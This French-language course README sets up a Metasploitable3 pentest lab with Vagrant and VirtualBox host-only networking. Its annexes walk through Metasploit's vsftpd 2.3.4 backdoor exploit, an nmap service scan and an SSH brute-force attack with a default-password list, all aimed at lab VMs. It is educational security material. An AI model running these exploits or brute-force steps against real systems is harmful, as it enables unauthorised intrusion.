# Tbale des matières
- Étape 0 - Différence entre `msfconsole` et `Metasploitable3` 
- Étape 1 - Installation de Metasploitable3 via VAGRANT
- Étape 2 - Configuration des cartes
- Étape 3 - Ajout des machines (Ubuntu 2204, Kali- linux, Windows 10) et configuration des cartes
- Étape 4 - Pinger les machines entre elles
- Étape 5 - Démarrer Metasploitable3
---
# 0 - Étape 0 - Différence entre `msfconsole` et `Metasploitable3` 

`msfconsole` et `Metasploitable3` sont deux composants très différents utilisés dans le domaine de la cybersécurité, chacun ayant un rôle spécifique. Voici une explication détaillée de chacun :

### msfconsole
- **Qu'est-ce que c'est ?** `msfconsole` est l'interface en ligne de commande du **Metasploit Framework**, un outil puissant utilisé pour le développement et l'exécution d'exploits contre des cibles distantes.
- `msfconsole` est l'interface en ligne de commande de Metasploit, un outil très puissant utilisé pour le développement et l'exécution d'exploits contre des machines distantes. C'est l'une des interfaces principales pour interagir avec le framework Metasploit, qui permet de tester la sécurité des systèmes informatiques en simulant des attaques.
- **Rôle :** `msfconsole` sert de plateforme pour lancer des scans, des exploits, et d'autres outils de sécurité. C'est un environnement interactif qui permet aux utilisateurs de rechercher, de configurer et d'exécuter des modules d'exploitation et des payloads sur des cibles spécifiées.
- **Utilisation :** Utilisé par les chercheurs en sécurité, les testeurs de pénétration et les professionnels de la cybersécurité pour identifier et exploiter les vulnérabilités dans les systèmes et les réseaux.

### Metasploitable3
- **Qu'est-ce que c'est ?** `Metasploitable3` est une machine virtuelle intentionnellement vulnérable, développée pour fournir un environnement d'entraînement sûr pour ceux qui apprennent la sécurité informatique et le test de pénétration.
- **Rôle :** `Metasploitable3` agit comme une cible d'entraînement, permettant aux utilisateurs de tester leurs compétences en sécurité informatique dans un environnement contrôlé. Elle est remplie de vulnérabilités configurées pour être exploitées, aidant ainsi à pratiquer diverses techniques de piratage éthique.
- **Utilisation :** Employée dans les milieux éducatifs et de formation pour pratiquer l'exploitation des failles de sécurité, la reconnaissance réseau, et plus encore.

### Différences Clés
- **Nature :** `msfconsole` est un outil ou une interface pour mener des attaques, tandis que `Metasploitable3` est une plateforme cible conçue pour être attaquée et testée.
- **Objectif :** `msfconsole` est utilisé pour attaquer ou tester la sécurité de systèmes, tandis que `Metasploitable3` est utilisé pour être attaqué dans un contexte d'apprentissage.
- **Interaction :** Dans un scénario typique d'entraînement en cybersécurité, `msfconsole` serait utilisé par l'attaquant pour exploiter les vulnérabilités présentes dans `Metasploitable3`.

En résumé, `msfconsole` est le moyen par lequel les attaques sont lancées et gérées, et `Metasploitable3` est l'environnement qui reçoit ces attaques, permettant l'apprentissage et l'amélioration des compétences en sécurité des systèmes d'information.


# Est-ce que  `msfconsole` ou `Metasploitable3` pointe sur une base de données ?

### msfconsole et la Base de Données

`msfconsole`, en tant que partie du Metasploit Framework, utilise effectivement une base de données pour plusieurs de ses fonctionnalités :
- **Stockage des Résultats** : Metasploit utilise une base de données PostgreSQL pour stocker les informations sur les sessions, les hôtes, les services découverts pendant les scans, et les résultats des divers exploits. Cela permet de conserver un historique des activités, de générer des rapports, et d'analyser les données collectées lors de différentes campagnes de test.
- **Optimisation des Performances** : L'utilisation d'une base de données améliore les performances en permettant à Metasploit de retrouver rapidement des informations sur des cibles précédemment analysées ou exploitées.
- **Intégration des Modules** : Certains modules de Metasploit, particulièrement ceux qui gèrent de grandes quantités de données, tirent avantage de la base de données pour stocker et gérer ces informations de manière efficace.

### Metasploitable3 et la Base de Données

`Metasploitable3`, d'un autre côté, peut inclure des services de base de données vulnérables pré-installés que les utilisateurs peuvent tenter d'exploiter. Ces bases de données sont des composants ciblés dans l'environnement d'apprentissage, par exemple :
- **Services SQL Vulnérables** : Metasploitable3 peut être équipé de versions vulnérables de MySQL, PostgreSQL, ou d'autres systèmes de gestion de base de données que les testeurs peuvent apprendre à exploiter (par exemple, injection SQL).
- **Données Exemplaires** : Ces bases de données peuvent contenir des données fictives pour simuler un environnement de production, permettant aux apprenants de pratiquer des techniques de piratage éthique telles que l'exfiltration de données.

### Conclusion

Alors que `msfconsole` utilise une base de données pour gérer efficacement les données liées à ses opérations de sécurité, `Metasploitable3` peut inclure des bases de données comme cibles d'exploitation pour l'éducation et la formation en cybersécurité. Dans les deux cas, la manipulation et l'interaction avec des bases de données sont centrales mais servent des objectifs différents dans le contexte de la cybersécurité.

#  1 - Étape 1 - Installation de Metasploitable3 



## Étapes d'Installation de Metasploitable3 sous Windows avec PowerShell dans WINDOWS

## 1. Installation de Chocolatey (si pas déjà installé) :

Ouvrez PowerShell en tant qu'administrateur et exécutez la commande suivante pour installer Chocolatey :

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
```

#### 2. Installation des outils nécessaires :

##### a. Git :

Installez Git via Chocolatey avec la commande suivante :

```powershell
choco install git -y
```

##### b. Packer :

Installez Packer via Chocolatey avec la commande suivante :

```powershell
choco install packer -y
```

##### c. Vagrant :

Téléchargez et installez la dernière version de Vagrant depuis le site officiel : [https://www.vagrantup.com/downloads](https://www.vagrantup.com/downloads).

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/0503325f-9df8-42f1-9012-9666d360930e)

## Installez vagrant en utilisant le .msi ou .exe (next , next , next , ...)
# IMPORTANT : REDÉMARREZ LA MACHINE APRÈS AVOIR INSTALLÉ VAGRANT

## AUTRES RÉFÉRENCES UTILES pour installer VAGRANT
- https://medium.com/@cnivesh/how-to-set-up-vagrant-on-windows-3bc841ea4811
- https://developer.hashicorp.com/vagrant/install?product_intent=vagrant


#### 3. Téléchargement et configuration de Metasploitable3 :

##### a. Clonez le repository Metasploitable3 depuis GitHub :

## Créez un dossier vagrant dans Documents (sous Windows) par exemple
```powershell
git clone https://github.com/rapid7/metasploitable3.git
cd .\metasploitable3\
vagrant box add jbarnett-r7/metasploitable3-win2k8
```
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/c04bcd6a-5b16-4077-8256-73068ef61c0e)

##### b. Initialisez et démarrez la machine virtuelle :

```powershell
vagrant init jbarnett-r7/metasploitable3-win2k8
vagrant up
```

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/a3097e08-a0ff-4ee4-b6c5-11358819783e)


#### 4. Connexion à la machine virtuelle :

Utilisez les identifiants par défaut pour vous connecter à la machine virtuelle :

- **Utilisateur :** vagrant
- **Mot de passe :** vagrant

#### 4. Arrêtez les deux machines crées pour configurer les cartes en host-only adapter :

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/425dfbcf-9c2c-45d9-bc35-08108a184216)


# Résumé
Voici les commandes essentielles pour installer Metasploitable3 sous Windows, présentées dans un format de script avec les commentaires pour chaque commande :

```plaintext
# Installer Chocolatey
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

# Installer Git via Chocolatey
choco install git -y

# Télécharger et installer l'exécutable de Vagrant
https://www.vagrantup.com/
# Installer Packer via Chocolatey
choco install packer -y

# Cloner le repository Metasploitable3
git clone https://github.com/rapid7/metasploitable3.git
cd .\metasploitable3\

# Ajouter l'image à Vagrant
vagrant box add jbarnett-r7/metasploitable3-win2k8

# Initialiser et démarrer la VM
vagrant init jbarnett-r7/metasploitable3-win2k8
vagrant up

# Connexion à la machine virtuelle avec les identifiants par défaut
# Utilisateur : vagrant
# Mot de passe : vagrant
```



#  2 - Étape 2 - Configuration des cartes

- Vérifiez vos cartes host-only-adapter (parfois il faut fermer et réouvrir virtual box pour la mise à jour)
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/02945df1-dfdc-4b47-bf84-a72d5d8433f5)

- Par exemple, vagrant a déscativé ma première carte et a crée une deuxième host-only adapter 2.
- Je supprime la carte host-only-adapter 2 et je réactive la première en coachant enable server dans DHCP Server. Récupérez l'adresse ( Dans mon cas, 172.28.128.2)

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/0b8e03f8-b3e8-4417-a9fe-b1641bfa675c)
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/b7e3acab-6b9b-4353-bfb1-b1090b20fddc)


- Dans la machine metasploitable ubuntu (on ignore la machine metasspoitable windows pour le moment ==­> la laisser éteinte) , nous choisissons le bridge adapter pour la première carte
  ![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/ab068404-272e-4599-9cae-d048920314d8)

- Pour la deuxième carte, nous choississons host-only adapter (le premier que nous avons gardé)

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/9b2e115b-b2ec-494a-ad9e-72287c4f737c)


# Étape 3 - Ajout des machines (Ubuntu 2204) et configuration des cartes

- Démarrez une machine Ubuntu2204
- Créez un groupe spécifique pour vos deux machines par exemple Metasploitable3 et bougez les deux machines dans ce groupe
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/94e6720c-43cf-442b-8e12-396b06779a1e)
- Configurez la machien ubuntu2204 : deux cartes
- Première carte : Bridge
- Deuxième carte : Host-Only-Adpater (même réseaux que Metasploitable)

  ![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/9059865a-ad62-4461-957c-dd02e4aa98d3)
  ![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/d26d1942-6d7b-4a62-b6e4-f82310cc2382)

  - Démarrez votre machine UbuntuDesktop2204 et remarquez qu'il n'y a pas d'adresses IP associé à la deuxième carte ????
  - Bon, dans mon cas, je suis chanceux et j'ai trouvé cette adresse 172.28.128.3
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/731873c3-0565-467c-a638-e861347dad25)
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/470d2055-0190-41d0-ab90-bcb69c65489c)

# Supposons que nous n'avons pas d'adresses associé à la deuxième carte enp0s8 ?
- Dans ce cas , appliquez ces manipulations dans
# ==> Annexe 1 -Configuration de l'Interface enp0s8

- Démarrez les deux machines et observez les adresses avec ip a
- Je donnerais pour éviter toute confusion l'adresse suivante à la machine Ubuntu2202 (172.28.128.5) ==> Annexe 1
    ```bash
    sudo ip a show enp0s8
    sudo ip link set enp0s8 down
    sudo ip addr add 172.28.128.5/24 dev enp0s8
    sudo ip link set enp0s8 up
    sudo ip a show enp0s8
    ```

- Pour la machine metasploitable3 (vagrant/vagrant), on peut avoir que l'adresse est 172.28.128.3 du réseaux Host Only adapter
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/2b03e446-7bcc-436f-a56c-0dc6e8421910)

---
# Résumons : Réseaux Host-only
- Adaptateur : 172.28.128.1/24
- DHCP server : 172.28.128.2/24
- Ensembles d'adresses permises de 172.28.128.3 => 172.28.128.244
- Machine metasploitable3 : 172.28.128.3/24
- Machine Ubuntu2204 : 172.28.128.5/24
---

# Étape 5 - Démarrer Metasploitable3 sur Ubuntu2204

```bash
    msfconsole
    snap install metasploit-framework
    msfconsole
```

---

# ANNEXE 1 - Configuration de l'Interface enp0s8
- README pour configurer l'interface réseau `enp0s8` (deuxième interface Host-Only) sur Kali Linux ou Ubuntu2204 afin de communiquer avec Metasploitable sur un réseau Host-Only :

# Configuration de l'Interface enp0s8 sur Kali Linux

Ce guide explique comment configurer l'interface réseau `enp0s8` (deuxième interface Host-Only) pour permettre la communication entre Kali Linux ou Ubuntu2204et Metasploitable sur un réseau Host-Only.

## Configurer une Adresse IP Statique pour enp0s8

1. **Ouvrir un Terminal sur Kali Linux**.

2. **Configurer l'adresse IP statique** pour `enp0s8`. Supposons que vous souhaitiez utiliser l'adresse `172.28.128.2` avec un masque de sous-réseau de `255.255.255.0` :

    ```bash
    sudo ip addr add 172.28.128.5/24 dev enp0s8
    sudo ip link set enp0s8 up
    ```

3. **Vérifier la configuration** :

    ```bash
    ip a show enp0s8
    ```

## Configurer le Routage (si nécessaire)

Pour une communication simple entre Metasploitable et Kali sur le réseau Host-Only, la configuration des routes supplémentaires ne devrait pas être nécessaire.

## Tester la Connectivité

Testez la connectivité avec l'adresse IP de Metasploitable (supposons que c'est `172.28.128.1`):

```bash
ping 172.28.128.1
```

Si vous obtenez une réponse, cela signifie que la configuration est correcte et que les deux machines peuvent communiquer l'une avec l'autre.

## Rendre la Configuration Persistante

Pour que cette configuration soit persistante à travers les redémarrages, éditez le fichier de configuration réseau. Voici comment faire pour les distributions utilisant `systemd-networkd` et pour celles utilisant encore les fichiers traditionnels `/etc/network/interfaces`.

### Pour systemd-networkd

Créez un fichier de configuration dans `/etc/systemd/network/`:

```bash
[Match]
Name=enp0s8

[Network]
Address=172.28.128.2/24
Gateway=172.28.128.1
```

### Pour les fichiers traditionnels `/etc/network/interfaces`

Ajoutez la configuration suivante :

```bash
auto enp0s8
iface enp0s8 inet static
    address 172.28.128.2
    netmask 255.255.255.0
    network 172.28.128.0
    broadcast 172.28.128.255
```

Assurez-vous d'adapter ces instructions à votre gestionnaire de réseau spécifique et redémarrez le service réseau ou la machine pour tester les changements.

---------
# Annexe 2 - Utilisation de Metasploit (`msfconsole`) et Test de Connectivité sur un Réseau Host-Only



**Metasploit Framework (`msfconsole`)** est une plateforme puissante pour le développement et l'exécution d'exploits contre des machines distantes. Voici un guide pour démarrer avec Metasploit sur votre machine Ubuntu et utiliser cette plateforme pour lancer des attaques sur une machine virtuelle Metasploitable3, ainsi que pour vérifier la connectivité entre les machines dans votre réseau Host-Only.

#### **Partie 1: Comprendre `msfconsole`**

`msfconsole` est l'interface en ligne de commande de Metasploit qui vous permet d'interagir avec le framework. Il n'est pas un "client" au sens traditionnel, mais plutôt un environnement interactif pour rechercher, configurer et utiliser des exploits et d'autres outils de sécurité.

#### **Partie 2: Installation de Metasploit**

Sur Ubuntu, suivez ces étapes pour installer Metasploit:

```bash
sudo snap install metasploit-framework
```

Une fois l'installation terminée, vous pouvez lancer Metasploit en tapant :

```bash
msfconsole
```

#### **Partie 3: Vérification de la Connectivité**

Avant de lancer des attaques, assurez-vous que toutes les machines peuvent se communiquer entre elles. Utilisez `ping` pour vérifier la connectivité :

- **Depuis Ubuntu vers Metasploitable3** :

  ```bash
  ping 172.28.128.3
  ```

- **Depuis Ubuntu vers une autre machine (par exemple une autre VM sous Windows ou Ubuntu)** :

  ```bash
  ping <IP autre machine>
  ```

Assurez-vous que les réponses ne montrent pas d'erreur et que les paquets sont reçus.

#### **Partie 4: Lancer une Attaque avec Metasploit**

1. **Lancez `msfconsole`** sur votre machine Ubuntu :

   ```bash
   msfconsole
   ```

2. **Recherchez un exploit approprié pour Metasploitable3**. Par exemple, pour exploiter un service FTP vulnérable :

   ```bash
   search vsftpd
   ```

3. **Choisissez et configurez l'exploit** :

   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 172.28.128.3
   ```

4. **Lancez l'exploit** :

   ```bash
   run
   ```

   Ou

   ```bash
   exploit
   ```

#### **Partie 5: Tester les Exploits et Récolter les Données**

Après avoir lancé l'exploit, observez les résultats. Si l'exploit réussit, vous pourriez obtenir un accès à la machine cible ou recueillir des informations sensibles.

#### **Résumé**

Ce README vous guide sur comment utiliser `msfconsole` pour tester la sécurité de machines dans un environnement virtuel. Assurez-vous de n'utiliser Metasploit que dans un cadre légal, typiquement dans un laboratoire de test ou avec des machines dont vous avez la permission explicite de tester. Toute utilisation non autorisée est illégale et éthiquement répréhensible.

---
# Annexe 3 - Explications - Question à Explorer avec les Étudiants

**Contexte :**  
Vous avez configuré un réseau virtuel Host-Only dans VirtualBox avec les paramètres suivants :

- **Adaptateur Host-Only** : 172.28.128.1/24
- **Serveur DHCP** : 172.28.128.2/24
- **Plage d'adresses permises** : de 172.28.128.3 à 172.28.128.244
- **Adresse IP de Metasploitable3** : 172.28.128.3/24
- **Adresse IP d'Ubuntu 2204** : 172.28.128.5/24

- Vous allez sur la machine Ubuntu et lancez les commandes suivantes :

```bash
snap install metasploit-framework
msfconsole
```

**Question :**  
Est-ce que `msfconsole` démarre sur la machine Metasploitable3 de Vagrant lorsque vous exécutez ces commandes sur Ubuntu ? Expliquez le rôle de `msfconsole` dans ce contexte et comment vous pouvez l'utiliser pour interagir avec la machine Metasploitable3.

**Réponse**

D'après la configuration de votre adaptateur Host-Only dans VirtualBox et les informations que vous avez fournies, votre réseau est configuré de manière à permettre la communication entre vos machines virtuelles sur le réseau isolé Host-Only.

Pour votre question sur Metasploit (`msfconsole`), voici comment cela fonctionne :

1. **Démarrage de Metasploit sur Ubuntu** : Lorsque vous lancez `msfconsole` sur la machine Ubuntu, vous êtes en train de démarrer l'interface de Metasploit sur cette machine, pas sur la machine Metasploitable3.

2. **Utilisation de Metasploit pour attaquer Metasploitable3** : Une fois que `msfconsole` est lancé sur Ubuntu, vous pouvez l'utiliser pour cibler la machine Metasploitable3 (qui a l'adresse IP 172.28.128.3 dans votre réseau Host-Only). Vous devrez utiliser des modules et des configurations spécifiques dans Metasploit pour lancer des attaques ou des scans sur la machine Metasploitable3.

3. **Commandes Metasploit** : Vous devrez configurer les options de Metasploit pour cibler l'adresse IP de Metasploitable3. Par exemple, pour un test simple, vous pourriez utiliser un module de scan de port ou d'exploitation, définir l'adresse IP de la cible (RHOSTS) sur `172.28.128.3`, et exécuter le module.

Metasploit ne démarre pas "sur" la machine Metasploitable3; il s'exécute sur Ubuntu et peut être utilisé pour interagir avec Metasploitable3 si configuré correctement.


---



---------
# Annexe 4 - Attaque par Force Brute sur un Service SSH avec Metasploit

#### Prérequis
1. **Kali Linux** (comme machine attaquante)
2. **Metasploitable 2** (comme machine cible)
3. **VirtualBox** (ou tout autre logiciel de virtualisation)
4. **Connexion réseau** entre les machines virtuelles

### Étapes de l'attaque par force brute SSH avec Metasploit

#### Étape 1: Configuration des machines virtuelles
1. Lancez Kali Linux et Metasploitable 2 dans VirtualBox.
2. Vérifiez les adresses IP des deux machines. Dans Kali Linux, utilisez la commande suivante :
    ```bash
    ifconfig
    ```
   Notez l'adresse IP de la machine cible (Metasploitable).

#### Explication des commandes
- `ifconfig` : Affiche les informations réseau, y compris l'adresse IP de votre machine.
- `nmap -sS -sV [adresse IP de la cible]` :
  - `-sS` : Effectue un scan SYN, qui est une méthode courante pour détecter les ports ouverts.
  - `-sV` : Identifie les versions des services en cours d'exécution sur les ports ouverts.

#### Étape 2: Scanner les ports ouverts de la machine cible
1. Sur Kali Linux, effectuez un scan Nmap pour identifier les ports ouverts sur la machine cible. Par exemple, si l'adresse IP de la machine cible est `192.168.0.5` :
    ```bash
    nmap -sS -sV 192.168.0.5
    ```
   Cela vous donnera la liste des ports ouverts et des services qui y sont associés. Recherchez spécifiquement le port 22/tcp qui est utilisé par le service SSH.

- Par exemple, j'ai scanné une machine windows 10 qui est sur le même natnetwork de notre machine Kalilinux (connectés via un naatnetwork)

![image](https://github.com/hrhouma/prevention-securite-de-linformation/assets/10111526/c1b39a58-f4f9-4d6a-84f6-a0bd41ba4282)


#### Étape 3: Configuration de Metasploit
1. Ouvrez la console Metasploit :
    ```bash
    msfconsole
    ```
2. Recherchez le module `ssh_login` :
    ```bash
    search ssh_login
    ```
3. Utilisez le module `auxiliary/scanner/ssh/ssh_login` :
    ```bash
    use auxiliary/scanner/ssh/ssh_login
    ```
4. Affichez les options du module :
    ```bash
    show options
    ```

#### Étape 4: Préparation du fichier de mots de passe
1. Créez un fichier de mots de passe nommé `passwords.txt`. Par exemple :
    ```plaintext
    msfadmin msfadmin
    root toor
    user 123456
    admin admin
    ```
   Sauvegardez ce fichier dans un répertoire de votre choix sur la machine Kali Linux, par exemple `/home/user/passwords.txt`.

#### Étape 5: Configuration des options de l'attaque
1. Définissez l'adresse IP de la cible (RHOST) :
    ```bash
    set RHOST 192.168.0.5
    ```
2. Définissez le nombre de threads pour accélérer l'attaque :
    ```bash
    set THREADS 3
    ```
3. Arrêtez l'attaque après un succès :
    ```bash
    set STOP_ON_SUCCESS true
    ```
4. Activez les sorties verbales pour voir les tentatives :
    ```bash
    set VERBOSE true
    ```
5. Fournissez le fichier de mots de passe (USERPASS_FILE) :
    ```bash
    set USERPASS_FILE /home/user/passwords.txt
    ```

#### Étape 6: Lancement de l'attaque
1. Lancez l'attaque en utilisant la commande :
    ```bash
    run
    ```
   Surveillez les tentatives dans le terminal. Si l'attaque réussit, Metasploit retournera le nom d'utilisateur et le mot de passe corrects.

### Exemple de fichier de mots de passe
Voici à nouveau un exemple de fichier de mots de passe (nommé `passwords.txt`) que vous pouvez utiliser :
```plaintext
msfadmin msfadmin
root toor
user 123456
admin admin
```

### Exemple d'adresse IP de cible
- **Machine attaquante (Kali Linux)** : 192.168.0.2
- **Machine cible (Metasploitable)** : 192.168.0.5

Assurez-vous que les adresses IP correspondent à votre configuration réseau. Vous pouvez utiliser des adresses IP dans la même plage pour les machines virtuelles pour simplifier la configuration.

### Conclusion
Ce tutoriel montre comment réaliser une attaque par force brute en utilisant Metasploit sur un service SSH d'une machine Metasploitable. Utilisez ces techniques uniquement dans un environnement contrôlé et à des fins éducatives. Attaquer des systèmes sans autorisation est illégal et contraire à l'éthique.

